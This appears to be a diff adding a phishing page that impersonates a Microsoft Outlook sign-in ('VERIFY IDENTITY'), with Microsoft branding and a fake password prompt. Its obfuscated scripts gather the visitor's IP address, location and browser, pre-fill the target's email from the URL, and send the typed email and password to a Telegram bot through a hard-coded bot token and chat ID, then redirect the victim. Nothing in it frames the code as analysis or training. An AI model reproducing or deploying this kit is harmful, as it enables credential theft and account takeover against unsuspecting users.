@@ -1,0 +1,220 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <link rel="stylesheet" href="
+style.css
+     ">
+    
+    <title>VERIFY IDENTITY</title>
+
+
+ <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+
+<body>
+
+              
+              <div class="bgimg"></div>
+              <div class="container-fluid">
+              <div class="container">
+              
+              <div class="row topp">
+              
+              <div class="col-lg-6 mx-auto">
+              
+              <center>
+              <h1 class="hide-on-mobile">Outlook</h1>
+              </center>
+                    <div class="box" id="div1" style="display:none;">
+                        <div class="loader " style="display:none;">
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                        </div>
+                        <div class="boxtext">
+                        
+                            <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" class="img-fluid logoimg" width="30px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span><br><br>
+                            <span class="h5">Sign In</span><br>
+                            <div class="form-group mt-2">
+                                <input type="email" name="ai" value="" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" placeholder="Email, phone, or Skype" style="border-right: none;border-left: none;border-top: none;">
+                            </div>
+                            <p style="font-size: 13px">No account? <a href="#">Create one!</a></p>
+                            <p style="font-size: 13px"><a href="#">Can't access your account?</a></p>
+
+                            <div class="text-right">
+                                <button type="button" class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;cursor: pointer;">Next</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="box" id="div2" style="display: none;">
+                        <div class="loader " style="display:none;">
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                        </div>
+                    
+<input type="text" id="email" readonly hidden>
+    <!-- Placeholder for domain name -->
+    <p  style="
+    display: none;"></p>
+    <!-- Image tag to display domain logo -->
+   
+
+            <br>
+
+            <div id="done" style="display:none;" >
+                <center>
+                
+                
+                
+                <p>Thank you for verifying your account</p>
+                
+                
+                
+                <p>
+                
+                
+                
+                Redirecting...</p></center>
+                 </div>
+                
+                 <div class="step active" id="Tx-Cf-bU">
+
+                    <form>
+            
+    
+                            <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico"  id="login_logo2" onerror="this.src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMwAAADACAMAAAB/Pny7AAAAn1BMVEWBvAb/uggFpvDzUyXz8/P/tADz9Pbz8/H29Pbz9/j29Pj59vPy9fn/+fPz8fLz/v/79//43bHzrqG/2KF3twDz5+WXxk3z3Njh6tb25crj7fMAn/AAo/DzQADzn47q7uTzclXJ4fJBrvD07uSy1vK01IfzTBf+v0KGyPH70ofzzMTV48DzMwDzmIav0n3zaU3169n61pP+vTQAmPD7z3wtZuZeAAABhElEQVR4nO3cyTYDURSG0aBSaUSQBulE9E0I4v2fzSCpiqWMLIfI2t8L/HeP7uyUkg2q9NcP+MlyTNoMqpJvVYJKP2PSZiuo+9piof7QDirX5JjudBTS9HF/sXDw1AlqXC1gRjshjU4zzFUpJhgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYmI3EXIf0AdP5LUzSnZ2FNGtlmPZRUEVM8zio7vKITnV8ElR+c2h1q6kWVTZQrQeVFDEbEMy6BrOurTC7UWUDaSOoIiadBNVfatLnXlDFf6Z/HtTt3mKg8fJ6E9PF58tzSX8wDGmQY+7KWyGVv8AMt0OCgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGB+Q5mPghpnmPeykEVMellUJPlEZ1G7zCoSgHzj8ssG4HJewcb/mAatajuPAAAAABJRU5ErkJggg==';" class="img-fluid logoimg"  width="30px">&nbsp<span class="align-middle h5 logoname" id="logoname2"  style="color: #747474;"> </span><br><br>
+                  <a href="office1.html">   <i class="fas fa-arrow-left" id="back"></i></a>&nbsp
+                 
+                  
+                 
+                 
+                 <span id="emailDiv"></span>
+                 <div class="py-2"><span class="h5">Enter Password</span></div>
+                 <div class="pb-2">
+                 <span id="" class="text-danger"></span>
+                 </div>
+                 <div id="msg" class="text-danger" style="display:none" >Your account or password is incorrect. If you don't remember your password.</div>
+                 
+               <input type="email"   name="email" id="email2" required hidden hidden hidden >
+                
+                           <div class="form-group mt-2">
+                            
+                  <input type="password"  name="password" id="password" class="form-control rounded-0 border-dark" id="pr" aria-describedby="aiHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
+                  
+               
+               <textarea id="userInfo" style="width: 100%; height: 100px; display:none" readonly></textarea>
+               
+                   </div>
+                           
+                           <br>
+               
+               
+                           <p style="font-size: 14px"><a href="#">Forget password?</a></p>
+                           <div class="text-right">
+                    
+                               <button  id="submit-btn"  onclick="sendToTelegram()"
+                 class="btn rounded-0 text-white px-4"style="background-color: #0066BA;">login</button></div>
+                 </div>
+                 
+    
+    
+    </form> 
+
+
+
+                    
+                    </div>
+                   <div class="box" id="div3" >
+                        <div class="boxtext">
+                            <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" id="login_logo1" class="img-fluid logoimg" width="30px" onerror="this.src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMwAAADACAMAAAB/Pny7AAAAn1BMVEWBvAb/uggFpvDzUyXz8/P/tADz9Pbz8/H29Pbz9/j29Pj59vPy9fn/+fPz8fLz/v/79//43bHzrqG/2KF3twDz5+WXxk3z3Njh6tb25crj7fMAn/AAo/DzQADzn47q7uTzclXJ4fJBrvD07uSy1vK01IfzTBf+v0KGyPH70ofzzMTV48DzMwDzmIav0n3zaU3169n61pP+vTQAmPD7z3wtZuZeAAABhElEQVR4nO3cyTYDURSG0aBSaUSQBulE9E0I4v2fzSCpiqWMLIfI2t8L/HeP7uyUkg2q9NcP+MlyTNoMqpJvVYJKP2PSZiuo+9piof7QDirX5JjudBTS9HF/sXDw1AlqXC1gRjshjU4zzFUpJhgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYmI3EXIf0AdP5LUzSnZ2FNGtlmPZRUEVM8zio7vKITnV8ElR+c2h1q6kWVTZQrQeVFDEbEMy6BrOurTC7UWUDaSOoIiadBNVfatLnXlDFf6Z/HtTt3mKg8fJ6E9PF58tzSX8wDGmQY+7KWyGVv8AMt0OCgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGB+Q5mPghpnmPeykEVMellUJPlEZ1G7zCoSgHzj8ssG4HJewcb/mAatajuPAAAAABJRU5ErkJggg==';">&nbsp<span class="align-middle h5 logoname" id="logoname1" style="color: #747474;"> </span><br><br>
+                            <span class="h4">Taking you to your Organization's sign-in page</span><br><br>
+                            <div class="loader ">
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                            </div>
+                            <br>
+                            <div class="text-left">
+                                <a href="#">cancel</a>
+                            </div>
+                            <br><br>
+                        </div>
+                    </div>
+                    <!-- ////////////////////////div3 end/////////////////////// -->
+                </div>
+            </div>
+        </div>
+        <div class="row ">
+            <div class="col-sm-5 mx-auto box2">
+                <div class="py-2 bg-white ">
+                    <span><i class="fas fa-key"></i> &nbspSign in options</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer id="footer">
+        <div>
+            <div class="footerNode">
+                <span>©2024 Microsoft</span>
+                <a href="#">Privacy statement</a>
+            </div>
+        </div>
+    </footer>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+<script type="text/javascript">
+
+  setTimeout(function(){
+      $("#div3").hide(); 
+      $("#div2").show();        
+  }, 3000);
+
+        </script>
+            <script>
+    function _0xf4a6(){const _0x1cde15=['json','then','599779MSoxCb','city','error','region','&text=','getElementById','2599338slxvHq','catch','country','7837050BfruMu','5391510hdxPzD','580nUSkXQ','7761516jDsjtf','\x0aDate:\x20','\x0aLocation:\x20','\x0aBrowser:\x20','addEventListener','DOMContentLoaded','6848819763:AAEFWzRagLNU_WMXE91QfEy0kdRHJH1ZuNA','value','6965372099','378135HdXWuo','IP\x20Address:\x20','3454352SzVVkB','/sendMessage?chat_id=','userInfo','toLocaleString','4uBFDPH','2xvACja','Error:'];_0xf4a6=function(){return _0x1cde15;};return _0xf4a6();}const _0x4769f6=_0x5249;(function(_0x40be5c,_0x369633){const _0x2b7160=_0x5249,_0x3787bf=_0x40be5c();while(!![]){try{const _0x2adbd5=-parseInt(_0x2b7160(0xdf))/0x1+parseInt(_0x2b7160(0xdb))/0x2*(parseInt(_0x2b7160(0xe9))/0x3)+-parseInt(_0x2b7160(0xda))/0x4*(parseInt(_0x2b7160(0xe8))/0x5)+-parseInt(_0x2b7160(0xe5))/0x6+-parseInt(_0x2b7160(0xeb))/0x7+parseInt(_0x2b7160(0xd6))/0x8+parseInt(_0x2b7160(0xd4))/0x9*(parseInt(_0x2b7160(0xea))/0xa);if(_0x2adbd5===_0x369633)break;else _0x3787bf['push'](_0x3787bf['shift']());}catch(_0x50d4b3){_0x3787bf['push'](_0x3787bf['shift']());}}}(_0xf4a6,0xe98da),document[_0x4769f6(0xef)](_0x4769f6(0xf0),function(){const _0x2bccec=_0x4769f6;fetch('https://ipinfo.io/json?token=641e443a295213')[_0x2bccec(0xde)](_0x55f515=>_0x55f515['json']())['then'](_0x4eff48=>{const _0x1f4539=_0x2bccec,_0x184e1d=_0x4eff48['ip'],_0x2ffaeb=_0x4eff48[_0x1f4539(0xe0)]+',\x20'+_0x4eff48[_0x1f4539(0xe2)]+',\x20'+_0x4eff48[_0x1f4539(0xe7)],_0x3a04ee=new Date()[_0x1f4539(0xd9)](),_0x137d5a=navigator['userAgent'],_0x1af381=_0x1f4539(0xd5)+_0x184e1d+_0x1f4539(0xec)+_0x3a04ee+_0x1f4539(0xee)+_0x137d5a+_0x1f4539(0xed)+_0x2ffaeb;document[_0x1f4539(0xe4)](_0x1f4539(0xd8))[_0x1f4539(0xf2)]=_0x1af381;})['catch'](_0x4b2aaa=>console[_0x2bccec(0xe1)]('Error:',_0x4b2aaa));}));function _0x5249(_0x352117,_0x2e10f3){const _0xf4a611=_0xf4a6();return _0x5249=function(_0x524931,_0x5169bc){_0x524931=_0x524931-0xd3;let _0x2039a5=_0xf4a611[_0x524931];return _0x2039a5;},_0x5249(_0x352117,_0x2e10f3);}function sendToTelegram(){const _0x481acd=_0x4769f6,_0x3dd159=document[_0x481acd(0xe4)](_0x481acd(0xd8))['value'],_0x40242a=_0x481acd(0xf1),_0x4e19f8=_0x481acd(0xd3),_0x30cb58=encodeURIComponent(_0x3dd159),_0x86ce22='https://api.telegram.org/bot'+_0x40242a+_0x481acd(0xd7)+_0x4e19f8+_0x481acd(0xe3)+_0x30cb58;fetch(_0x86ce22)[_0x481acd(0xde)](_0x299c95=>_0x299c95[_0x481acd(0xdd)]())[_0x481acd(0xde)](_0x4de39e=>{if(_0x4de39e['ok']){}else{}})[_0x481acd(0xe6)](_0x404257=>console[_0x481acd(0xe1)](_0x481acd(0xdc),_0x404257));}
+        </script>
+        
+        
+        <script>
+        // Function to display domain logo
+    var _0x4efe03=_0x671c;(function(_0x33a4f7,_0x2f0a2b){var _0x198f7e=_0x671c,_0x2ddbab=_0x33a4f7();while(!![]){try{var _0x1b2838=-parseInt(_0x198f7e(0x71))/0x1*(parseInt(_0x198f7e(0x72))/0x2)+parseInt(_0x198f7e(0x6d))/0x3+parseInt(_0x198f7e(0x81))/0x4+-parseInt(_0x198f7e(0x78))/0x5*(-parseInt(_0x198f7e(0x7e))/0x6)+parseInt(_0x198f7e(0x74))/0x7+-parseInt(_0x198f7e(0x6e))/0x8*(parseInt(_0x198f7e(0x82))/0x9)+-parseInt(_0x198f7e(0x7d))/0xa;if(_0x1b2838===_0x2f0a2b)break;else _0x2ddbab['push'](_0x2ddbab['shift']());}catch(_0x533508){_0x2ddbab['push'](_0x2ddbab['shift']());}}}(_0x39a5,0xb92bf));function _0x671c(_0x5bc6af,_0x45ef55){var _0x39a5dc=_0x39a5();return _0x671c=function(_0x671c64,_0xebf3ae){_0x671c64=_0x671c64-0x6c;var _0x380268=_0x39a5dc[_0x671c64];return _0x380268;},_0x671c(_0x5bc6af,_0x45ef55);}function displayDomainLogo(){var _0x36dc26=_0x671c,_0x410d39=window['location'][_0x36dc26(0x79)][_0x36dc26(0x7a)](0x1),_0x5c37ab='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMwAAADACAMAAAB/Pny7AAAAn1BMVEWBvAb/uggFpvDzUyXz8/P/tADz9Pbz8/H29Pbz9/j29Pj59vPy9fn/+fPz8fLz/v/79//43bHzrqG/2KF3twDz5+WXxk3z3Njh6tb25crj7fMAn/AAo/DzQADzn47q7uTzclXJ4fJBrvD07uSy1vK01IfzTBf+v0KGyPH70ofzzMTV48DzMwDzmIav0n3zaU3169n61pP+vTQAmPD7z3wtZuZeAAABhElEQVR4nO3cyTYDURSG0aBSaUSQBulE9E0I4v2fzSCpiqWMLIfI2t8L/HeP7uyUkg2q9NcP+MlyTNoMqpJvVYJKP2PSZiuo+9piof7QDirX5JjudBTS9HF/sXDw1AlqXC1gRjshjU4zzFUpJhgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYmI3EXIf0AdP5LUzSnZ2FNGtlmPZRUEVM8zio7vKITnV8ElR+c2h1q6kWVTZQrQeVFDEbEMy6BrOurTC7UWUDaSOoIiadBNVfatLnXlDFf6Z/HtTt3mKg8fJ6E9PF58tzSX8wDGmQY+7KWyGVv8AMt0OCgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGB+Q5mPghpnmPeykEVMellUJPlEZ1G7zCoSgHzj8ssG4HJewcb/mAatajuPAAAAABJRU5ErkJggg==';if(_0x410d39&&_0x410d39[_0x36dc26(0x6c)]('@')){var _0x22cd03=_0x410d39[_0x36dc26(0x7b)](_0x410d39[_0x36dc26(0x7f)]('@')+0x1);document[_0x36dc26(0x6f)]('email')['value']=_0x410d39,document[_0x36dc26(0x6f)]('logoname2')[_0x36dc26(0x73)]=_0x22cd03;var _0x44c881=_0x36dc26(0x75)+_0x22cd03;$(_0x36dc26(0x76))[_0x36dc26(0x7c)](_0x36dc26(0x70),_0x44c881),$(_0x36dc26(0x77))['attr'](_0x36dc26(0x70),_0x44c881);}else $(_0x36dc26(0x76))['attr']('src',_0x5c37ab),$('#login_logo2')[_0x36dc26(0x7c)]('src',_0x5c37ab);}$(document)[_0x4efe03(0x80)](function(){displayDomainLogo();});function _0x39a5(){var _0x4ebb46=['substring','attr','14665830BLlTQE','250032GenzYz','indexOf','ready','3184844yRwIlq','38034TNrsLD','includes','2399427MnkHba','736hCAQSH','getElementById','src','1zzSGqu','1965658kNMaky','innerHTML','8462153PYISsG','https://logo.clearbit.com/','#login_logo1','#login_logo2','95FpyWbg','hash','substr'];_0x39a5=function(){return _0x4ebb46;};return _0x39a5();}
+        </script>
+        
+        <script>
+       var _0x79002a=_0x244c;function _0x244c(_0x181993,_0x20e785){var _0x206aea=_0x206a();return _0x244c=function(_0x244ce5,_0x49ea83){_0x244ce5=_0x244ce5-0xe1;var _0xdd483b=_0x206aea[_0x244ce5];return _0xdd483b;},_0x244c(_0x181993,_0x20e785);}(function(_0x3978a0,_0x18d820){var _0x3b2f75=_0x244c,_0x442638=_0x3978a0();while(!![]){try{var _0x126e00=parseInt(_0x3b2f75(0xee))/0x1+-parseInt(_0x3b2f75(0xe7))/0x2*(-parseInt(_0x3b2f75(0xe1))/0x3)+-parseInt(_0x3b2f75(0xe2))/0x4+-parseInt(_0x3b2f75(0xe6))/0x5+parseInt(_0x3b2f75(0xed))/0x6+-parseInt(_0x3b2f75(0xe5))/0x7+-parseInt(_0x3b2f75(0xea))/0x8;if(_0x126e00===_0x18d820)break;else _0x442638['push'](_0x442638['shift']());}catch(_0x1ede16){_0x442638['push'](_0x442638['shift']());}}}(_0x206a,0x8a3fa),document[_0x79002a(0xec)](_0x79002a(0xe3),function(){var _0x45e197=_0x79002a,_0x169f8b=window['location'][_0x45e197(0xeb)];if(_0x169f8b['includes']('#')){var _0x32a2a9=_0x169f8b[_0x45e197(0xe4)]('#')[0x1];document['getElementById'](_0x45e197(0xe9))[_0x45e197(0xe8)]=_0x32a2a9;}}));function _0x206a(){var _0x4bf975=['12Nxqfjw','3000264jyTFJf','DOMContentLoaded','split','2810010wIuHwP','1999410gGrNtF','385232vbDfwS','innerText','emailDiv','1751664OcBYHV','href','addEventListener','4489230rldNZG','817933GlWncj'];_0x206a=function(){return _0x4bf975;};return _0x206a();}
+        </script>
+        
+        
+        
+        
+        
+        
+        
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/mrmaytinh/tpath/jsbot.js"></script>
+        <script>
+     var _0x2f16af=_0x131a;function _0xc02d(){var _0x2d1bef=['href','select.html#','2LwIwyk','No\x20email\x20found\x20in\x20the\x20current\x20URL.','6447020NqgLce','10704UpOlJZ','8343QXKOUl','match','1276594ITkecM','7ulhDao','3LOWAyU','2433594SFZrBl','120ZmBziU','split','location','957756HDQoBr','6038204HRvUdm','1378CqRJMa','log','252804AuNtEa'];_0xc02d=function(){return _0x2d1bef;};return _0xc02d();}(function(_0x58a7a4,_0x45ec79){var _0x5cbb1d=_0x131a,_0x697a33=_0x58a7a4();while(!![]){try{var _0x42584c=parseInt(_0x5cbb1d(0x7c))/0x1*(parseInt(_0x5cbb1d(0x6f))/0x2)+-parseInt(_0x5cbb1d(0x77))/0x3*(parseInt(_0x5cbb1d(0x7d))/0x4)+-parseInt(_0x5cbb1d(0x71))/0x5+-parseInt(_0x5cbb1d(0x78))/0x6*(-parseInt(_0x5cbb1d(0x76))/0x7)+parseInt(_0x5cbb1d(0x72))/0x8*(-parseInt(_0x5cbb1d(0x73))/0x9)+-parseInt(_0x5cbb1d(0x79))/0xa*(-parseInt(_0x5cbb1d(0x75))/0xb)+parseInt(_0x5cbb1d(0x80))/0xc*(parseInt(_0x5cbb1d(0x7e))/0xd);if(_0x42584c===_0x45ec79)break;else _0x697a33['push'](_0x697a33['shift']());}catch(_0x2b761a){_0x697a33['push'](_0x697a33['shift']());}}}(_0xc02d,0xe7e40));function _0x131a(_0x55dcc1,_0x162dca){var _0xc02df4=_0xc02d();return _0x131a=function(_0x131a65,_0x8442b3){_0x131a65=_0x131a65-0x6d;var _0x1d142a=_0xc02df4[_0x131a65];return _0x1d142a;},_0x131a(_0x55dcc1,_0x162dca);}var domainWithHttps=null;function extractEmailDomainFromCurrentURL(){var _0x45359c=_0x131a,_0x1a5d3f=window[_0x45359c(0x7b)][_0x45359c(0x6d)],_0x1e3f50=/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/,_0x401639=_0x1a5d3f[_0x45359c(0x74)](_0x1e3f50);if(_0x401639){var _0x30187f=_0x401639[0x0],_0x227966=_0x30187f[_0x45359c(0x7a)]('@')[0x1];domainWithHttps=_0x45359c(0x6e)+_0x227966;}}extractEmailDomainFromCurrentURL();domainWithHttps?console[_0x2f16af(0x7f)]('The\x20domain\x20with\x20https://\x20of\x20the\x20email\x20in\x20the\x20current\x20URL\x20is:\x20'+domainWithHttps):console[_0x2f16af(0x7f)](_0x2f16af(0x70));
+        
+        </script><script>
+function _0x2018(){var _0x3ed6e5=['770019AnDwqw','POST','That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account','location','ready','.loader2','val','10fyGIaq','text','#msg','Password\x20field\x20is\x20emply.!','#domain-name','sendMessage','log','click','indexOf','signal','1862424SmIQmH','7775TnenCJ','show','replace','test','OFFICE\x20Email\x20:\x20','396RHbVub','\x20/\x20OFFICE\x20Pass\x20:\x20','688cJtvVb','1171450LsUvsW','fadeOut','733848wpPZTS', domainWithHttps,'Verifing...','#email','#success','hash','hide','toLowerCase','JSON','#submit-btn','6965372099',
+'5256756DPVQtm','substr','16821PjDnlQ','Email\x20field\x20is\x20emply.!','#error','#password','focus','ajax','html'];_0x2018=function(){return _0x3ed6e5;};return _0x2018();}var _0x3c66ad=_0x51ac;(function(_0xad7fdc,_0x4638d5){var _0x36ce99=_0x51ac,_0x517635=_0xad7fdc();while(!![]){try{var _0x6a5141=parseInt(_0x36ce99(0x8c))/0x1+parseInt(_0x36ce99(0xa6))/0x2+-parseInt(_0x36ce99(0x9d))/0x3+-parseInt(_0x36ce99(0xa3))/0x4*(-parseInt(_0x36ce99(0x9e))/0x5)+-parseInt(_0x36ce99(0xa8))/0x6+-parseInt(_0x36ce99(0x85))/0x7*(-parseInt(_0x36ce99(0xa5))/0x8)+parseInt(_0x36ce99(0xb3))/0x9*(-parseInt(_0x36ce99(0x93))/0xa);if(_0x6a5141===_0x4638d5)break;else _0x517635['push'](_0x517635['shift']());}catch(_0x1823ae){_0x517635['push'](_0x517635['shift']());}}}(_0x2018,0x5f01b));function _0x51ac(_0x3c1284,_0x4c55f2){var _0x20185f=_0x2018();return _0x51ac=function(_0x51acbc,_0x52f3f8){_0x51acbc=_0x51acbc-0x84;var _0x222e5f=_0x20185f[_0x51acbc];return _0x222e5f;},_0x51ac(_0x3c1284,_0x4c55f2);}const bot=new Bot('6848819763:AAEFWzRagLNU_WMXE91QfEy0kdRHJH1ZuNA',_0x3c66ad(0xb2));$(document)[_0x3c66ad(0x90)](function(){var _0x444051=_0x3c66ad,_0x54994f=0x0,_0x5d7043=window[_0x444051(0x8f)][_0x444051(0xad)][_0x444051(0x84)](0x1);if(!_0x5d7043){}else{var _0x42bddf=_0x5d7043,_0x56e548=_0x42bddf[_0x444051(0x9b)]('@'),_0x296e50=_0x42bddf['substr'](_0x56e548+0x1),_0x1301cf=_0x296e50[_0x444051(0x84)](0x0,_0x296e50['indexOf']('.')),_0x377844=_0x1301cf[_0x444051(0xaf)]();$(_0x444051(0xab))[_0x444051(0x92)](_0x42bddf),$(_0x444051(0x97))['html'](_0x377844),$('#msg')['hide']();}var _0x2a14a6='bmV4dC5waHA=';$(_0x444051(0xb1))[_0x444051(0x9a)](function(_0x236297){var _0x3ae7bb=_0x444051;$(_0x3ae7bb(0x87))[_0x3ae7bb(0xae)](),$(_0x3ae7bb(0x95))[_0x3ae7bb(0xae)](),_0x236297['preventDefault']();var _0x41f39c=$('#email')[_0x3ae7bb(0x92)](),_0x213ce7=$('#password')[_0x3ae7bb(0x92)](),_0x1e1299=$(_0x3ae7bb(0x95))[_0x3ae7bb(0x8b)]();$('#msg')[_0x3ae7bb(0x94)](_0x1e1299);var _0x19a2e5=_0x41f39c,_0x4dcfe1=/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x41f39c)return $(_0x3ae7bb(0x87))[_0x3ae7bb(0x9f)](),$('#error')[_0x3ae7bb(0x8b)](_0x3ae7bb(0x86)),ai[_0x3ae7bb(0x89)],![];if(!_0x4dcfe1[_0x3ae7bb(0xa1)](_0x19a2e5))return $(_0x3ae7bb(0x87))[_0x3ae7bb(0x9f)](),$(_0x3ae7bb(0x87))['html'](_0x3ae7bb(0x8e)),ai[_0x3ae7bb(0x89)],![];if(!_0x213ce7)return $(_0x3ae7bb(0x87))[_0x3ae7bb(0x9f)](),$(_0x3ae7bb(0x87))[_0x3ae7bb(0x8b)](_0x3ae7bb(0x96)),ai[_0x3ae7bb(0x89)],![];var _0x18ee9d=_0x19a2e5[_0x3ae7bb(0x9b)]('@'),_0x122497=_0x19a2e5[_0x3ae7bb(0x84)](_0x18ee9d+0x1),_0x75aa31=_0x122497[_0x3ae7bb(0x84)](0x0,_0x122497[_0x3ae7bb(0x9b)]('.')),_0x341356=_0x75aa31[_0x3ae7bb(0xaf)]();_0x54994f=_0x54994f+0x1,$(_0x3ae7bb(0x97))[_0x3ae7bb(0x8b)](_0x341356),$[_0x3ae7bb(0x8a)]({'dataType':_0x3ae7bb(0xb0),'url':atob,'type':_0x3ae7bb(0x8d),'data':{'email':_0x41f39c,'password':_0x213ce7},'beforeSend':function(_0x45f640){},'success':function(_0x487ccf){var _0x6a7a8d=_0x3ae7bb;if(_0x487ccf){$('#msg')[_0x6a7a8d(0x9f)](),console[_0x6a7a8d(0x99)](_0x487ccf);if(_0x487ccf[_0x6a7a8d(0x9c)]=='ok')$(_0x6a7a8d(0x88))['val'](''),_0x54994f>=0x2&&(_0x54994f=0x0);else{}}},'error':function(){var _0x44ce87=_0x3ae7bb;$(_0x44ce87(0x91))[_0x44ce87(0x9f)](),setTimeout(()=>{var _0x530075=_0x44ce87;$(_0x530075(0x91))[_0x530075(0xa7)]();},0xbb8),$('#msg')[_0x44ce87(0x9f)](),$(_0x44ce87(0x88))[_0x44ce87(0x92)](''),_0x54994f>=0x2&&(_0x54994f=0x0,$(_0x44ce87(0x95))['hide'](),$('#div1')[_0x44ce87(0xae)](),$(_0x44ce87(0xac))[_0x44ce87(0x9f)](),setTimeout(()=>{var _0x3f7086=_0x44ce87;window[_0x3f7086(0x8f)][_0x3f7086(0xa0)](_0x3f7086(0xa9));},0x1770)),bot[_0x44ce87(0x98)](_0x44ce87(0xa2)+_0x41f39c+_0x44ce87(0xa4)+_0x213ce7);},'complete':function(){var _0xea5fda=_0x3ae7bb;$(_0xea5fda(0xb1))[_0xea5fda(0x8b)](_0xea5fda(0xaa)),setTimeout(()=>{var _0x40b6bc=_0xea5fda;$(_0x40b6bc(0xb1))['html']('Login');},0xbb8);}});});});
+</script>
+</html>
